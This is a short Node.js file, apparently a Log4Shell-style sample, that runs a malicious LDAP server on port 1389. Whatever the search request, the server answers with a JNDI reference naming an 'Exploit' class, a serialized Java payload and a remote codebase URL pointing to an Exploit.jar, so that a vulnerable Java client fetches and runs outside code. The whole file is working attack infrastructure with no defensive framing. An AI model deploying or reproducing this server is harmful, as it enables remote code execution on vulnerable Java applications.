const ldap = require('ldapjs')
const server = ldap.createServer()
const port = 1389
// com.sun.jndi.ldap.object.trustURLCodebase = true
server.search('', (req, res, next) => {
  // Print request attributes to the console
  console.log(req);

  // Dummy response
  res.send({
    dn: '',
    attributes: {
		javaClassName: 'Exploit',
		javaSerializedData: Buffer.from('rO0ABXNyABNvcmcuZXhwbG9pdC5FeHBsb2l0qpnQ3f5bGOADAAB4cHg=', 'base64'),
		javaCodeBase: 'https://raw.githubusercontent.com/etojesaandro/log4j-sample/main/Exploit.jar'
	}
  })

  res.end()
})

server.listen(port, () => {
  console.log(`LDAP server listening at ${server.url}`)
})
